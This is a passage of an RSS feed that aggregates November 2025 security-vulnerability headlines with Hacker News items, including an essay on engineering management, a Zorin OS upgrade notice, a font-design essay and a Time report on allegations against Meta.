            NVIDIA has issued a security update to address two high-severity vulnerabilities in its NVIDIA Isaac-GROOT software. Isaac-GROOT is an open foundation model for generalized humanoid robot reasoning an ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Good and well-renowned Universities Worldwide for Master’s in Infosec (Preferably Europe - Public Universities; Open to Other countries/continents)</title><link>http://test.com/</link><author>/u/bhavsec381</author><category>netsec</category><pubDate>Mon, 24 Nov 2025 01:12:11 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>vLLM Flaw (CVE-2025-62164) Risks Remote Code Execution via Malicious Prompt Embeddings</title><link>https://securityonline.info/vllm-flaw-cve-2025-62164-risks-remote-code-execution-via-malicious-prompt-embeddings/</link><author></author><category>security</category><pubDate>Mon, 24 Nov 2025 00:40:16 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[vLLM Flaw (CVE-2025-62164) Risks Remote Code Execution via Malicious Prompt Embeddings
            A newly disclosed high-severity vulnerability in vLLM—one of the fastest-growing open-source inference engines for large language models—allows attackers to crash servers or potentially execute arbitr ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>CERT/CC Warns of Unpatched Root-Level Command Injection Flaws in Tenda 4G03 Pro and N300 Routers (CVE-2025-13207, CVE-2024-24481)</title><link>https://securityonline.info/cert-cc-warns-of-unpatched-root-level-command-injection-flaws-in-tenda-4g03-pro-and-n300-routers-cve-2025-13207-cve-2024-24481/</link><author></author><category>security</category><pubDate>Mon, 24 Nov 2025 00:29:54 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            The CERT Coordination Center (CERT/CC) has issued a warning about multiple unpatched command injection vulnerabilities affecting Tenda’s 4G03 Pro and N300 series routers. The flaws, which allow attack ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Critical ABB Flaw (CVE-2025-10571, CVSS 9.6) Allows Unauthenticated RCE and Admin Takeover on Edgenius</title><link>https://securityonline.info/critical-abb-flaw-cve-2025-10571-cvss-9-6-allows-unauthenticated-rce-and-admin-takeover-on-edgenius/</link><author></author><category>security</category><pubDate>Mon, 24 Nov 2025 00:22:30 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            ABB has issued an urgent cybersecurity advisory warning customers of a critical authentication bypass vulnerability in the ABB Ability Edgenius Management Portal. The flaw—tracked as CVE-2025-10571—af ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Critical Markdown to PDF Flaw (CVE-2025-65108, CVSS 10.0) Allows RCE via JS Injection in Markdown Front-Matter</title><link>https://securityonline.info/critical-markdown-to-pdf-flaw-cve-2025-65108-cvss-10-0-allows-rce-via-js-injection-in-markdown-front-matter/</link><author></author><category>security</category><pubDate>Mon, 24 Nov 2025 00:11:58 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            A critical vulnerability (CVE-2025-65108) has been disclosed in the widely used Markdown to PDF npm package, a command-line tool with more than 47,000 weekly downloads. The flaw carries a maximum CVSS ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>X&apos;s new country-of-origin feature reveals many &apos;US&apos; accounts to be foreign-run</title><link>https://www.hindustantimes.com/world-news/us-news/xs-new-country-of-origin-feature-shakes-maga-and-democrat-circles-as-many-us-accounts-revealed-to-be-foreignrun-101763857104296.html</link><author>ourmandave</author><category>dev</category><pubDate>Sun, 23 Nov 2025 23:25:03 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Elon Musk's X, formerly Twitter, has introduced the country of origin feature that seems to have thrown both the MAGA and Democrats' worlds online into chaos. Several profiles online, that had pushed certain narratives are now being found to have been operating from outside the US.The social media platform introduced a feature where one can see the country the account is based in. One has to head to an account and click on the date joined tab, which opens up onto a new page. This shows the country where that particular account is being operated from. While the feature was briefly removed after its introduction, it has now been added again, and both sides of the political spectrum are having a field day, calling out each other online.What to know about ‘American’ accounts based out of USThe accounts being discussed here have pushed agendas within the US, and commented on US politics regularly. Many are also named to echo political movements, like some MAGA accounts.However, these ‘political influencers’ have been found to be based outside the US, raising questions about the motives.One profile going by 'MAGA NATION' with a follower count of over 392,000, is based out of eastern Europe. Similarly, ‘Dark Maga’ a page with over 15,000 followers is based out of Thailand. ‘MAGA Scope’ which boasts over 51,000 followers is actually operated out of Nigeria, and ‘America First’, an account with over 67,000 followers is based out of Bangladesh.“At this time thousands of MAGA-aligned influencer accounts and large political pages that claim to be based in the U.S. are now being investigated and exposed with many of them traced to India, Nigeria, and other countries,” a news aggregator page on X noted.It wasn't just on the MAGA side. An account going by ‘Ron Smith’ whose bio claims he's a ‘Proud Democrat’ and ‘Professional MAGA hunter’ is operated out of Kenya. The account has over 52,000 followers.‘Republicans against Trump’ an anti-Donald Trump page on X, which tries to push politics against MAGA, was reportedly operating out of Austria. While the location now shows US, X notes that the account location might not be accurate due to use of VPN. “The Anti-Trump account “Republicans Against Trump” which 1M followed has been identified as a non-American from Austria and is currently using a VPN to hide their location,” a page said, making note of this.‘Republicans against Trump’ has over 978,000 followers.On a side note, an account going by ‘Mariana Times’, with over 78,000 followers, which posts pro-Israel content has been found to be based out of India. People within the MAGA orbit have also reacted to this new feature. Congresswoman Anna Paulina Luna wrote on X from her personal account, “All of these pretend “pro-America” accounts that were pushing infighting within Maga are literally foreign grifters. I’m telling you, the foreign opp is real and so are the bot accounts.” Alexis Wilkins, FBI director Kash Patel's girlfriend, also added, “I hope that everyone sees, regardless of their specific reason, that the enemy is outside of the house. The people posing as Americans with big American opinions but are actually operating from a basement across the world have one common goal - to destroy the United States. We have our issues, but we really can’t allow them to succeed.”]]></content:encoded></item><item><title>Weaponized file name flaw makes updating glob an urgent job</title><link>https://go.theregister.com/feed/www.theregister.com/2025/11/23/infosec_news_in_brief/</link><author></author><category>security</category><pubDate>Sun, 23 Nov 2025 22:46:44 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            Infosec In Brief Researchers have urged users of the glob file pattern matching library to update their installations, after discovery of a years-old remote code execution flaw in the tool's CLI.
Glob ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Iowa City made its buses free. Traffic cleared, and so did the air</title><link>https://www.nytimes.com/2025/11/18/climate/iowa-city-free-buses.html</link><author>bookofjoe</author><category>dev</category><pubDate>Sun, 23 Nov 2025 22:06:44 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>µcad: New open source programming language that can generate 2D sketches and 3D</title><link>https://microcad.xyz/</link><author>todsacerdoti</author><category>dev</category><pubDate>Sun, 23 Nov 2025 20:51:22 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Welcome to the website of µcad!]]></content:encoded></item><item><title>&quot;Good engineering management&quot; is a fad</title><link>https://lethain.com/good-eng-mgmt-is-a-fad/</link><author>jkbyc</author><category>dev</category><pubDate>Sun, 23 Nov 2025 20:16:04 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[As I get older, I increasingly think about
whether I’m spending my time the right way
to advance my career and my life.
This is also a question that your company
asks about you every performance cycle:
is this engineering manager spending their
time effectively to advance the company or their organization?Confusingly, in my experience, answering these nominally similar questions
has surprisingly little in common.
This piece spends some time exploring both questions in the particularly
odd moment we live in today, where managers are being told they’ve
spent the last decade doing the wrong things, and need to engage
with a new model of engineering management in order to be
valued by the latest iteration of the industry.If you’d be more interested in a video version of this,
here is the recording of a practice run I gave for a talk
centered on these same ideas
(slides from talk).When I started my software career at Yahoo in the late 2000s, I had two 1:1s with my manager over the course of two
years. The first one came a few months after I started, and he mostly asked me about a colleague’s work quality.
The second came when I gave notice that I was leaving to join Digg.
A modern evaluation of this manager would be scathing, but his management style closely resembled that of the
team leader in The Soul of A New Machine:
identifying an important opportunity for the team, and navigating the broader organization that might impede progress
towards that goal.
He was, in the context we were working in, an effective manager.Compare that leadership style to the expectations of the 2010s, where attracting, retaining, and motivating engineers
was emphasized as the most important leadership criteria in many organizations.
This made sense in the era of hypergrowth, where budgets were uncapped
and many companies viewed hiring strong engineers as their constraint on growth.
This was an era where managers were explicitly told to stop writing software as the first step of their transition into management,
and it was good advice! Looking back we can argue it was bad guidance by today’s standards, but it aligned the managers with the leadership expectations
of the moment.Then think about our current era, that started in late 2022, where higher interest rates killed zero-interest-rate-policy (ZIRP)
and productized large language models are positioned as killing deep Engineering organizations.
We’ve flattened Engineering organizations where many roles that previously focused on coordination
are now expected to be hands-on keyboard, working deep in the details.
Once again, the best managers of the prior era–who did exactly what the industry asked them to do–are now reframed as bureaucrats
rather than integral leaders.In each of these transitions, the business environment shifted, leading to a new formulation of ideal leadership.
That makes a lot of sense: of course we want leaders to fit the necessary patterns of today.
Where things get weird is that in each case a morality tale was subsequently superimposed on top of the transition:In the 2010s, the morality tale was that it was all about empowering engineers as a fundamental good.
Sure, I can get excited for that, but I don’t really believe that narrative: it happened because hiring was competitive.In the 2020s, the morality tale is that bureaucratic middle management have made organizations stale and inefficient.
The lack of experts has crippled organizational efficiency.
Once again, I can get behind that–there’s truth here–but the much larger drivers aren’t about morality,
it’s about ZIRP-ending and optimism about productivity gains from AI tooling.The conclusion here is clear: the industry will want different things from you as it evolves,
and it will tell you that each of those shifts is because of some complex moral change,
but it’s pretty much always about business realities changing.
If you take any current morality tale as true, then you’re setting yourself up
to be severely out of position when the industry shifts again in a few years,
because “good leadership” is just a fad.Self-development across leadership fadsIf you accept the argument that the specifically desired leadership skills of today
are the result of fads that frequently shift, then it leads to an important followup question:
what are the right skills to develop in to be effective today and to be impactful across fads?Having been and worked with engineering managers for some time, I think there are
eight foundational engineering management skills,
which I want to personally group into two clusters: core skills that are essential to operate in all roles
(including entry-level management roles), and growth skills whose presence–or absence–determines
how far you can go in your career.: lead team to deliver expected tangible and intangible work.
Fundamentally, management is about getting things done, and you’ll neither
get an opportunity to begin managing, nor stay long as a manager, if your
teams don’t execute.: ship projects, manage on-call rotation, sprint planning, manage incidents: shape the team and the environment such that they succeed.
This is  working for the team, nor is it working for your leadership, it is
finding the balance between the two that works for both.: hiring, coaching, performance management, advocate with your management: navigate reality to make consistent progress, even when reality is difficult
Finding a way to get things done, rather than finding a way that it not getting done is someone else’s fault.: doing hard things, showing up when it’s uncomfortable, being accountable despite systemic issues: build shared understanding across leadership, stakeholders, your team, and the problem space.
Finding a realistic plan that meets the moment, without surprising or being surprised by those around you.: document and share top problems, and updates during crises: exercise discerning judgment about what “good” looks like—technically, in business terms, and in process/strategy.
Taste is a broadchurch, and my experience is that broad taste is an somewhat universal criteria for truly senior roles.
In some ways, taste is a prerequisite to Amazon’s Are Right, A Lot.: refine proposed product concept,
avoid high-risk rewrite,
find usability issues in team’s work: your team, stakeholders, and leadership know what you’re doing and why, and agree that it makes sense.
In particular, they understand how you are overcoming your biggest problems. So clarity is not, “Struggling with scalability issues”
but instead “Sharding the user logins database in a new cluster to reduce load.”: identify levers to progress,
create plan to exit a crisis,
show progress on implementing that plan: work from complex problem to opinionated, viable approach.
If you’re given an extremely messy, open-ended problem, can you still find a way to make progress?
(I’ve written previously about this topic.): launching a new business line,
improving developer experience,
going from 1 to N cloud regionsWorking across timescales: ensure your areas of responsibility make progress across both the short and long term.
There are many ways to appear successful by cutting corners today, that end in disaster tomorrow.
Success requires understanding, and being accountable for, how different timescales interact.: have an explicit destination,
ensure short-term work steers towards it,
be long-term rigid and short-term flexibleHaving spent a fair amount of time pressure testing these, I’m pretty sure most effective managers, and manager archetypes, can be fit into these boxes.Self-assessing on these skillsThere’s no perfect way to measure anything complex, but here are some thinking
questions for you to spend time with as you assess where you stand on each of these skills:When did your team last have friction delivering work? Is that a recurring issue?What’s something hard you shipped that went really, really well?When were you last pulled onto solving a time-sensitive, executive-visible project?Who was the last strong performer you hired?Have you retained your strongest performers?What strong performers want to join your team?Which peers consider your team highly effective?When did an executive describe your team as exceptional?When did you or your team overcome the odds to deliver something important? (Would your stakeholders agree?)What’s the last difficult problem you solved that stayed solved (rather than reoccurring)?When did you last solve the problem first before addressing cross-team gaps?When was the last time you were surprised by a stakeholder? What could you do to prevent that reoccuring?How does a new stakeholder understand your prioritization tradeoffs (incl rationale)?When did you last disappoint a stakeholder without damaging your relationship?What stakeholders would join your company because they trust you?What’s a recent decision that is meaningfully better because you were present?If your product counterpart left, what decisions would you struggle to make?Where’s a subtle clarification that significantly changed a design or launch?How have you inflected team’s outcomes by seeing around corners?What’s a difficult trade-off you recently helped your team make?How could you enable them to make that same trade-off without your direct participation?What’s a recent decision you made that was undone? How?What problem have you worked on that was stuck before assisted, and unstuck afterwards?Do senior leaders bring ambiguous problems to you? Why?Working across timescalesWhat’s a recent trade off you made between short and long-term priorities?How do you inform these tradeoffs across timescales?What long-term goals are you protecting at significant short-term cost?Most of these questions stand on their own, but it’s worth briefly explaining
the “Have you ever been pulled into a SpecificSortOfProject by an executive?” questions.
My experience is that in most companies, executives will try to poach you onto their most
important problems that correspond to your strengths.
So if they’re never attempting to pull you in then either you’re not considered as particularly
strong on that dimensions, or you’re already very saturated with other work such that it doesn’t
seem possible to pull you in.Are “core skills” the same over time?While those groupings of “core” and “growth” skills are obvious groupings to me,
what I came to appreciate while writing this is that some skills swap between core to growth
as the fads evolve.
Where  is a foundational skill today, it was less of a core skill in the hypergrowth era,
and even less in the investor era.This is the fundamentally tricky part of succeeding as an engineering manager across fads:
you need a sufficiently broad base across each of these skills to be successful, otherwise
you’re very likely to be viewed as a weak manager when the eras unpredictably end.Stay energized to stay engagedThe “Manage your priorities and energy” chapter in
The Engineering Executive’s Primer
captures an important reality that took me too long to understand:
the perfect allocation of work is not the mathematically ideal allocation that maximizes impact.
Instead, it’s the balance between that mathematical ideal and doing
things that energize you enough to stay motivated over the long haul.
If you’re someone who loves writing software, that might involve writing a bit more than helpful to your team.
If you’re someone who loves streamlining an organization, it might be improving a friction-filled process that is a personal affront, even if it’s not causing  overall inefficiency.Similarly to the question of prioritizing activities to stay energized, there’s also understanding
where you are in your career, an idea I explored in A forty-year career.For each role, you have the chance to prioritize across different dimensions like pace, people, prestige, profit, or learning.
There’s no “right decision,” and there are always tradeoffs.
The decisions you make early in your career will compound over the following forty years.
You also have to operate within the constraints of your life today and your possible lives tomorrow.
Early in my career, I had few responsibilities to others, and had the opportunity to work extremely hard
at places like Uber. Today, with more family responsibilities, I am unwilling to make the tradeoffs to
consistently work that way, which has real implications on how I think about which roles to prioritize
over time.Recognizing these tradeoffs, and making them deliberately, is one of the highest value things you can do
to shape your career. Most importantly, it’s extremely hard to have a career at all if you don’t think about
these dimensions and have a healthy amount of self-awareness to understand the tradeoffs that will allow you
to stay engaged over half a lifetime.Published on October 26, 2025.]]></content:encoded></item><item><title>1M Downloads of Zorin OS 18</title><link>https://blog.zorin.com/2025/11/18/test-the-upgrade-from-zorin-os-17-to-18-and-celebrating-1-million-downloads-of-zorin-os-18/</link><author>m463</author><category>dev</category><pubDate>Sun, 23 Nov 2025 19:38:15 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Upgrade directly and keep your existing files, apps, and settings. Available for testing today.We’re thrilled to announce that Zorin OS 18 has amassed  in just over a month since its release, breaking all previous records.The response from users, tech reviewers, and creators around the world has been incredible:“Zorin OS 18 is very polished indeed and an excellent choice for those seeking to migrate from Windows…”“All-in-all, the ZorinOS team has taken a great Linux desktop OS and made it even better.”“I really, really like Zorin Appearance… I thought this was an excellent feature for people coming over from Windows.”“Zorin OS is a standout choice for ex-Windows users… It’s one of the best free Linux variants that actually feels like Windows”What’s even more encouraging is that over 78% of these downloads came from Windows. This influx of new users reflects our mission to provide a better alternative to the incumbent PC operating systems from Big Tech.We would like to take this moment to extend a massive thank you to everyone who has downloaded, shared, and supported our biggest release ever. Your enthusiasm is what drives us to make Zorin OS even better!Upgrades from Zorin OS 17 to 18We’re also excited to announce that we’re officially launching upgrades from Zorin OS 17 to 18 today.This upgrade path is in early testing and is currently only available to users of the Zorin OS 17 Core, Education, and Pro editions. Upgrading now will allow us to collect feedback and fix bugs to improve the user experience before its full stable launch in the coming weeks.This upgrade path is designed to allow existing Zorin OS 17 users to upgrade their computers to Zorin OS 18 directly, without needing to re-install the operating system. This means you’ll be able to keep your files, apps, and settings, all while taking advantage of the new features and improvements in Zorin OS 18.How to upgrade from Zorin OS 17 to 18 (in testing) This upgrade path is not recommended for production machines yet. Upgrading during the testing period may cause stability issues or breakages on your system.Install the latest software updates by opening the Zorin Menu → System Tools → Software Updater and following the on-screen instructions.Open the Zorin Menu → Utilities → Terminal and enter this command:gsettings set com.zorin.desktop.upgrader show-test-upgrades trueFollow the instructions in stage 3 of this guide to complete the upgrade process.After the testing period is completed in the coming weeks, this upgrade option will be available to all Zorin OS 17 users through the  app. Stay tuned to our newsletter to be the first to know when upgrades are enabled for everyone.]]></content:encoded></item><item><title>SEC Voluntarily Dismisses SolarWinds Litigation</title><link>https://databreaches.net/2025/11/23/sec-voluntarily-dismisses-solarwinds-litigation/?pk_campaign=feed&amp;pk_kwd=sec-voluntarily-dismisses-solarwinds-litigation</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 23 Nov 2025 18:42:40 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Fran Sans – font inspired by San Francisco light rail displays</title><link>https://emilysneddon.com/fran-sans-essay</link><author>ChrisArchitect</author><category>dev</category><pubDate>Sun, 23 Nov 2025 18:20:27 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Fran Sans is a display font in every sense of the term. It’s an interpretation of the destination displays found on some of the light rail vehicles that service the city of San Francisco. because destination displays aren’t consistently used across the city’s transit system. In fact, SF has an unusually high number of independent public transit agencies. Unlike New York, Chicago or L.A., which each have one, maybe two, San Francisco and the greater Bay Area have over two dozen. Each agency, with its own models of buses and trains, use different destination displays, creating an eclectic patchwork of typography across the city.Among them, one display in particular has always stood out to me: the LCD panel displays inside Muni’s Breda Light Rail Vehicles. I remember first noticing them on a Saturday in October on the N-Judah, heading to the Outer Sunset for a shrimp hoagie. This context is important, as anyone who’s spent an October weekend in SF knows this is the optimal vibe to really take in the beauty of the city. 
What caught my eye was how the displays look mechanical and yet distinctly personal. Constructed on a 3×5 grid, the characters are made up of geometric modules: squares, quarter-circles, and angled forms. Combined, these modules create imperfect, almost primitive letterforms, revealing a utility and charm that feels distinctly like the San Francisco I’ve come to know.
This balance of utility and charm seems to show up everywhere in San Francisco and its history. The Golden Gate’s “International Orange” started as nothing more than a rust-proof primer, yet is now the city’s defining colour. The Painted Ladies became multicoloured icons after the 1960s Colourist movement covered decades of grey paint. Even the steepness of the streets was once an oversight in city planning but has since been romanticised in films and on postcards. So perhaps it is unsurprising that I would find this same utility and charm in a place as small and functional as a train sign.
To learn more about these displays, I visited the San Francisco Municipal Transportation Agency’s (SFMTA) Electronics Shop at Balboa Park. There, technician Armando Lumbad had set up one of the signs. They each feature one large LCD panel which displays the line name, and twenty-four smaller ones to display the destination. The loose spacing of the letters and fluorescent backlighting gives the sign a raw, analogue quality. Modern LED dot-matrix displays are far more efficient and flexible, but to me, they lack the awkwardness that makes these Breda signs so delightful.
Armando showed me how the signs work. He handed me a printed matrix table listing every line and destination, each paired with a three-digit code. On route, train operators punch the code into a control panel at the back of the display, and the LCD blocks light on specific segments of the grid to build each letter. I picked code 119, and Armando entered it for me. A few seconds later the panels revealed my own stop: the N-Judah at Church & Duboce. There in the workshop, devoid of the context of the trains and the commute, the display looked almost monolithic, or sculptural, and I have since fantasised whether it would be possible to ship one of these home to Australia.
Looking inside of the display, I found labels identifying the make and model. The signs were designed and manufactured by Trans-Lite, Inc., a company based in Milford, Connecticut that specialised in transport signage from 1959 until its acquisition by the Nordic firm Teknoware in 2012. After lots of amateur detective work, and with the help from an anonymous Reddit user in a Connecticut community group, I was connected with Gary Wallberg, Senior Engineer at Trans-Lite and the person responsible for the design of these very signs back in 1999.
Learning that the alphabet came from an engineer really explains its temperament and why I was drawn to it in the first place. The signs were designed for sufficiency: fixed segments, fixed grid, and no extras. Characters were created only as destinations required them, while other characters, like the Q, X, and much of the punctuation, were never programmed into the signs. In reducing everything to its bare essentials, somehow character emerged, and it’s what inspired me to design Fran Sans.I shared some initial drawings with Dave Foster of Foster Type who encouraged me to get the font software Glyphs and turn it into my first working font. From there, I broke down the anatomy of the letters into modules, then used them like Lego to build out a full set: uppercase A–Z, numerals, core punctuation. 
Some glyphs remain unsolved in this first version, for example the standard @ symbol refuses to squeeze politely into the 3×5 logic. Lowercase remains a question for the future, and would likely mean reconsidering the grid. But, as with the displays themselves, I am judging Fran Sans as sufficient for now.
Getting up close to these signs, you’ll notice Fran Sans’ gridlines are simplified even from its real‑life muse, but my hope is that its character remains. Specifically: the N and the zero, where the unusually thick diagonals close in on the counters; and the Z and 7, whose diagonals can feel uncomfortably thin. I’ve also noticed the centre of the M can scale strangely and read like an H at small sizes, but in fairness, this type was never designed for the kind of technical detail so many monospaced fonts aim for. Throughout the process I tried to protect these unorthodox moments, because to me, they determined the success of this interpretation.
Fran Sans comes in three styles: Solid, Tile, and Panel, each building in visual complexity. The decision to include variations, particularly the Solid style, was inspired by my time working at Christopher Doyle & Co. There, we worked with Bell Shakespeare, Australia’s national theatre company dedicated to the works of William Shakespeare. The equity of the Bell Shakespeare brand lies in its typography, which is a beautiful custom typeface called Hotspur, designed and produced by none other than Dave Foster.
Often, brand fonts are chosen or designed to convey a single feeling. Maybe it’s warmth and friendliness, or a sense of tech and innovation. But what I’ve always loved about the Bell typeface is how one weight could serve both Shakespeare’s comedies and tragedies, simply by shifting scale, spacing, or alignment. Hotspur has the gravity to carry the darkness of  and the roundness to convey the humour of . And while Fran Sans Solid is technically no Hotspur, I wanted it to share that same versatility.
Further inspiration for Fran Sans came from the Letterform Archive, the world’s leading typography archive, based in San Francisco. Librarian and archivist Kate Long Stellar thoughtfully curated a research visit filled with modular typography spanning most of the past century. On the table were two pieces that had a significant impact on Fran Sans and are now personal must-sees at the archive. First, Joan Trochut’s  “Fast Type” (1942) was created during the Second World War when resources were scarce.  gave printers the ability to draw with type, rearranging modular pieces to form letters, ornaments and even illustrations.
Second, Zuzana Licko’s process work for  (1985), an Emigre typeface, opened new ways of thinking about how ideas move between the physical and the digital and then back again. Seeing how  was documented through iterations and variations gave the typeface a depth and richness that changed my understanding of how fonts are built. At some point I want to explore physical applications for Fran Sans out of respect for its origins, since it is impossible to fully capture the display’s charm on screen.
Back at the SFMTA, Armando told me the Breda vehicles are being replaced, and with them their destination displays will be swapped for newer LED dot-matrix units that are more efficient and easier to maintain. By the end of 2025 the signs that inspired Fran Sans will disappear from the city, taking with them a small but distinctive part of the city’s voice. 
That feels like a real loss. San Francisco is always reinventing itself, yet its charm lies in how much of its history still shows through. My hope is that Fran Sans can inspire a deeper appreciation for the imperfections that give our lives and our cities character. Life is so rich when ease and efficiency are not the measure.]]></content:encoded></item><item><title>Native Secure Enclave backed SSH keys on macOS</title><link>https://gist.github.com/arianvp/5f59f1783e3eaf1a2d4cd8e952bb4acf</link><author>arianvanp</author><category>dev</category><pubDate>Sun, 23 Nov 2025 17:55:11 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CVE-2025-48507 - Arm Trusted Firmware (TF-A) Secure State Exposure</title><link>https://cvefeed.io/vuln/detail/CVE-2025-48507</link><author></author><category>vulns</category><pubDate>Sun, 23 Nov 2025 17:15:47 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-48507
 Nov. 23, 2025, 5:15 p.m. | 25 minutes ago
The security state of the calling processor into Arm® Trusted Firmware (TF-A) is not used and could potentially allow non-secure processors access to secure memories, access to crypto operations, and the ability to turn on and off subsystems within the SOC.
 8.6 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>Are consumers just tech debt to Microsoft?</title><link>https://birchtree.me/blog/are-consumers-just-tech-debt-to-microsoft/</link><author>ingve</author><category>dev</category><pubDate>Sun, 23 Nov 2025 17:14:41 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[I’m not saying this will definitely happen, but I think we could be on the cusp of a significant shift in Windows market share for consumer computers. It is not going to drop to 2% in a year or anything, but I feel like a few pieces are coming together that could move the needle in a way we have not seen in several decades. There are three things on my mind .Number one is that Microsoft just does not feel like a consumer tech company at all anymore. Yes, they have always been much more corporate than the likes of Apple or Google, but it really shows in the last few years as they seem to only have energy for AI and web services. If you are not a customer who is a major business or a developer creating the next AI-powered app, Microsoft does not seem to care about you.I just do not see excitement there. The only thing of note they have added to Windows in the last five years is Copilot, and I have yet to meet a normal human being who enjoys using it. And all the Windows 11 changes seem to have just gone over about as well as a lead balloon. I just do not think they care at all about Windows with consumers.The second thing is the affordable MacBook rumored to be coming out in 2026. This will be a meaningfully cheaper MacBook that people can purchase at price points that many Windows computers have been hovering around for many years. Considering Apple’s focus on consumers first and a price point that can get more people in the door, it seems like that could move the needle.The third thing is gamers. Gamers use Windows largely because they have to, not because they are passionate about it. Maybe they were passionate about it in the 90s, but any passion has gone away. Now it is just the operating system they use to launch Steam. In early 2026, Valve is going to release the Steam Machine after a few years of success with the Steam Deck. We will see how they do there, but what they are doing is releasing a machine that runs Windows games on Linux. And it runs them really well. The Steam Deck has proven that over the last few years. If someone can package up a version of Linux that is optimized for gamers, then I think there is a meaningful number of PC gamers who would happily run that on their computer instead.I do not know if this is going to happen. It is always easy to be cynical and suggest everything will stay the same, and I understand that markets of this size take a long time to change. However, it just feels like there are some things happening right now that are going to move the needle, and I am excited to see what happens.]]></content:encoded></item><item><title>Calculus for Mathematicians, Computer Scientists, and Physicists [pdf]</title><link>https://mathcs.holycross.edu/~ahwang/print/calc.pdf</link><author>o4c</author><category>dev</category><pubDate>Sun, 23 Nov 2025 16:31:50 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>73% of AI startups are just prompt engineering</title><link>https://pub.towardsai.net/i-reverse-engineered-200-ai-startups-73-are-lying-a8610acab0d3</link><author>kllrnohj</author><category>dev</category><pubDate>Sun, 23 Nov 2025 16:17:57 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>SonicWall SSLVPN Vulnerability CVE-2025-40601</title><link>https://thecyberthrone.in/2025/11/23/sonicwall-sslvpn-vulnerability-cve-2025-40601/</link><author></author><category>security</category><pubDate>Sun, 23 Nov 2025 16:07:26 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            November 23, 2025A critical vulnerability was discovered affecting SonicWall firewalls’ SSLVPN service, identified as CVE-2025-40601. This stack-based buffer overflow flaw allows unauthenticated remot ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Google enables Pixel-to-iPhone file sharing via Quick Share, AirDrop</title><link>https://www.bleepingcomputer.com/news/mobile/google-enables-pixel-to-iphone-file-sharing-via-quick-share-airdrop/</link><author>Bill Toulas</author><category>security</category><pubDate>Sun, 23 Nov 2025 15:32:46 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Google has added interoperability support between Android Quick Share and Apple AirDrop, to let users share files between Pixel devices and iPhones. [...]]]></content:encoded></item><item><title>Court filings allege Meta downplayed risks to children and misled the public</title><link>https://time.com/7336204/meta-lawsuit-files-child-safety/</link><author>binning</author><category>dev</category><pubDate>Sun, 23 Nov 2025 15:18:00 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Sex trafficking on Meta platforms was both difficult to report and widely tolerated, according to a court filing unsealed Friday. In a plaintiffs’ brief filed as part of a major lawsuit against four social media companies, Instagram’s former head of safety and well-being Vaishnavi Jayakumar testified that when she joined Meta in 2020 she was shocked to learn that the company had a “17x” strike policy for accounts that reportedly engaged in the “trafficking of humans for sex.” “You could incur 16 violations for prostitution and sexual solicitation, and upon the 17th violation, your account would be suspended,” Jayakumar reportedly testified, adding that “by any measure across the industry, [it was] a very, very high strike threshold.” The plaintiffs claim that this testimony is corroborated by internal company documentation.The brief, filed by plaintiffs in the Northern District of California, alleges that Meta was aware of serious harms on its platform and engaged in a broad pattern of deceit to downplay risks to young users. According to the brief, Meta was aware that millions of adult strangers were contacting minors on its sites; that its products exacerbated mental health issues in teens; and that content related to eating disorders, suicide, and child sexual abuse was frequently detected, yet rarely removed. According to the brief, the company failed to disclose these harms to the public or to Congress, and refused to implement safety fixes that could have protected young users.  “Meta has designed social media products and platforms that it is aware are addictive to kids, and they’re aware that those addictions lead to a whole host of serious mental health issues,” says Previn Warren, the co-lead attorney for the plaintiffs in the case. “Like tobacco, this is a situation where there are dangerous products that were marketed to kids,” Warren adds. “They did it anyway, because more usage meant more profits for the company.” The following allegations against Meta come from the brief filed in an unprecedented multidistrict litigation. More than 1,800 plaintiffs—including children and parents, school districts, and state attorneys general—have joined together in a suit alleging that the parent companies behind Instagram, TikTok, Snapchat, and YouTube “relentlessly pursued a strategy of growth at all costs, recklessly ignoring the impact of their products on children’s mental and physical 